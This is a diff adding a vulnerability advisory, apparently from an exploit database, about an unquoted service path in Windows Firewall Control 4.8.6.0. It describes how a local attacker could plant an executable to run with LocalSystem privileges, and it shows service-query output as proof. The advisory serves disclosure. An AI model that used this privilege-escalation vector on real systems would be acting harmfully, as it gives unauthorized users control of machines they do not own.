@@ -1,0 +1,27 @@
+# Exploit Title: Windows Firewall Control Unquoted Service Path Privilege Escalation
+# Date: 24/09/2016
+# Exploit Author: zaeek@protonmail.com
+# Vendor Homepage: http://www.binisoft.org
+# Version: 4.8.6.0
+# Tested on: Windows 7 32/64bit
+
+====Description====
+
+Windows Firewall Control lacks of the quotes in filepath, causing it to be a potential vector of privilege escalation attack.
+To properly exploit this vulnerability, the local attacker must insert an executable file in the path of the service. Upon service restart or system reboot, the malicious code will be run with elevated privileges.
+
+====Proof-of-Concept====
+
+C:\\Users\\testusr>sc qc _wfcs
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: _wfcs
+TYPE : 10 WIN32_OWN_PROCESS
+START_TYPE : 2 AUTO_START
+ERROR_CONTROL : 1 NORMAL
+BINARY_PATH_NAME : C:\\Program Files\\Windows Firewall Control\\wfcs.exe
+LOAD_ORDER_GROUP :
+TAG : 0
+DISPLAY_NAME : Windows Firewall Control
+DEPENDENCIES : MpsSvc
+SERVICE_START_NAME : LocalSystem
